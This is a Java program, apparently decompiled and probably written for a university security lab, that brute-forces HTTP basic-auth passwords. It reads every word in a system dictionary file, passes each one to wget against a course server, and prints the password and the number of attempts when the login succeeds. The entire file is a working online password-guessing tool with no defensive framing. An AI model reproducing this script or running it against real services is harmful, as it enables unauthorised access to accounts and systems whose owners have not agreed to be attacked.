public class Dictionary {
    public Dictionary() {
        super();
    }
    public static void main ( String[] a ) {
        label0: {
            java.io.FileNotFoundException a0 = null;
            label1: try {
                try {
                    java.io.BufferedReader a1 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.FileReader ( "/usr/share/lib/dict/words" ) );
                    int i = 0;
                    label2: while ( true ) {
                        java.io.IOException a2 = null;
                        String s = a1.readLine();
                        if ( s == null ) {
                            break;
                        }
                        try {
                            Process a3 = Runtime.getRuntime().exec ( new StringBuilder().append ( "wget --http-user= --http-passwd=" ).append ( s ).append ( " " ).append ( "http://sec-crack.cs.rmit.edu./SEC/2/" ).toString() );
                            java.io.BufferedReader a4 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.InputStreamReader ( a3.getInputStream() ) );
                            java.io.BufferedReader a5 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.InputStreamReader ( a3.getErrorStream() ) );
                            while ( true ) {
                                String s0 = a4.readLine();
                                if ( s0 == null ) {
                                    while ( true ) {
                                        String s1 = a5.readLine();
                                        if ( s1 == null ) {
                                            try {
                                                a3.waitFor();
                                            } catch ( InterruptedException ignoredException ) {
                                            }
                                            i = i + 1;
                                            if ( a3.exitValue() == 0 ) {
                                                System.out.println ( new StringBuilder().append ( "**********PASSWORD IS: " ).append ( s ).toString() );
                                                System.out.println ( new StringBuilder().append ( "**********NUMBER OF TRIES: " ).append ( i ).toString() );
                                                System.exit ( 1 );
                                            }
                                            continue label2;
                                        } else {
                                            System.out.println ( s1 );
                                        }
                                    }
                                } else {
                                    System.out.println ( s0 );
                                }
                            }
                        } catch ( java.io.IOException a6 ) {
                            a2 = a6;
                        }
                        System.out.println ( "exception happened - here's what I know: " );
                        a2.printStackTrace();
                        System.exit ( -1 );
                    }
                    System.out.println ( "DICTIONARY BRUTE FORCE UNABLE  FIND PASSWORD" );
                    System.out.println ( "**********Sorry, password was not found in dictionary file" );
                    System.exit ( 1 );
                } catch ( java.io.FileNotFoundException a7 ) {
                    a0 = a7;
                    break label1;
                }
                break label0;
            } catch ( java.io.IOException a8 ) {
                System.out.println ( ( Object ) a8 );
                break label0;
            }
            System.out.println ( ( Object ) a0 );
        }
    }
}
